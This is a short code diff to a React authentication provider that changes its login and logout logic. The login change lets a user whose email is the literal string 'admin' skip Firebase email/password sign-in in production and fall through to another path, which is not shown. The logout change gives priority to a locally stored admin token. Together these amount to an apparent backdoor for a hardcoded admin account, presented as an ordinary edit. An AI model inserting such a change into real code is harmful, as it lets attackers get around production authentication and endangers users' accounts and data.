@@ -108,7 +108,7 @@ export function AuthProvider({ children }) {
   const login = async (email, password) => {
     setAuthError(null);
     try {
-      if (import.meta.env?.PROD) {
+      if (import.meta.env?.PROD && email !== 'admin') {
         const credential = await signInWithEmailAndPassword(firebaseAuth, email, password);
         setToken(await credential.user.getIdToken());
         await refreshAccountData();
@@ -152,10 +152,10 @@ export function AuthProvider({ children }) {
   // Logout handler
   const logout = async () => {
     try {
-      if (import.meta.env?.PROD) {
-        await signOut(firebaseAuth);
-      } else if (user?.role === 'admin') {
+      if (user?.role === 'admin') {
         localStorage.removeItem('adminToken');
+      } else if (import.meta.env?.PROD) {
+        await signOut(firebaseAuth);
       } else {
         await api.auth.logout().catch(() => {});
       }
